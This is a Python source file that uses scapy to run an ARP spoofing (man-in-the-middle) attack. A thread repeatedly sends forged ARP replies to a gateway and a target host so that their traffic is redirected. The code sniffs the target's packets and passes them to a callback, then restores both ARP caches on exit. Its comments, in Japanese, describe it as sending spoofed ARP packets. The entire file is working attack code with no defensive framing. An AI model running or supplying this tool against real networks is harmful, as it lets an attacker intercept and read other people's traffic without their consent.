# -*- coding: utf-8 -*-

from scapy.all import Ether, ARP, conf, sniff, send, srp
import sys
import threading
import logging


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    logging.info("Restoring target arp cache")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(
        dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=3, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def send_fake_arp(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = ARP(op=2,
                        psrc=gateway_ip,
                        pdst=target_ip,
                        hwdst=target_mac)
    poison_gateway = ARP(op=2,
                         psrc=target_ip,
                         pdst=gateway_ip,
                         hwdst=gateway_mac)

    logging.info("Tell fake arp reply to %s" % target_ip)

    while True:
        send(poison_target)
        send(poison_gateway)
        if stop_event.wait(3):
            break

    logging.info("Stop fake arp reply to %s" % target_ip)
    return


def start_fakegw(gateway_ip=None, target_ip=None, interface=None,
                 bpf_filter=None, callback=None):
    """
    ARPパケット偽装して投げます。
    :param gateway_ip: 通信相手A
    :param target_ip: 通信相手B
    :param interface: インターフェース名
    :param bpf_filter: BPFフィルタ形式の文字列
    :param callback: パケット処理する関数
    :return: None
    """
    # インタフェースの設定
    if interface is not None:
        conf.iface = interface
    conf.verb = 0
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        logging.error("Failed to get gateway mac")
        sys.exit(0)
    else:
        logging.info("Gateway %s is at %s" % (gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)

    if target_mac is None:
        logging.error(" Failed to get target mac. Exiting.")
        sys.exit(0)
    else:
        logging.info("Target %s is at %s" % (target_ip, target_mac))

    # 偽ARPを投げるスレッド作成
    stop_event = threading.Event()
    poison_thread = threading.Thread(target=send_fake_arp,
                                     args=(gateway_ip,
                                           gateway_mac,
                                           target_ip,
                                           target_mac,
                                           stop_event))
    poison_thread.start()

    logging.info("Starting sniffer for %s" % target_ip)

    if bpf_filter is None:
        bpf_filter = "ip host %s" % target_ip
    if interface is None:
        sniff(filter=bpf_filter, prn=callback, store=0)
    else:
        sniff(filter=bpf_filter, prn=callback, iface=interface, store=0)

    # スレッドの停止
    stop_event.set()
    poison_thread.join()

    # ネットワークの復元
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
